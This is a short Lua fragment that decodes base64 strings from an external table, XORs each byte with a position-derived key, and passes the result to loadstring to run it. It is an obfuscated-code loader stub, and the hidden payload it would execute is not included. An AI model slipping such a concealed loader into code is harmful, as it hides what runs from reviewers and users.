local abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local map = {}
for i=1,#abc do map[abc:sub(i,i)] = i-1 end
local out,total,acc,bits = {},0,0,0
for _,block in ipairs(z) do
  for i=1,#block do
    local n = map[block:sub(i,i)]
    if n~=nil then
      acc = acc*64+n
      bits = bits+6
      if bits>=8 then
        bits=bits-8
        local byte=math.floor(acc/(2^bits))
        acc=acc%(2^bits)
        total=total+1
        out[total]=string.char(bit32.bxor(byte,(73+total*17)%256))
      end
    end
  end
end
local compile = loadstring or load
if type(compile)~="function" then error("Lua loader not supported") end
local fn,err=compile(table.concat(out))
if not fn then error(err) end
return fn()
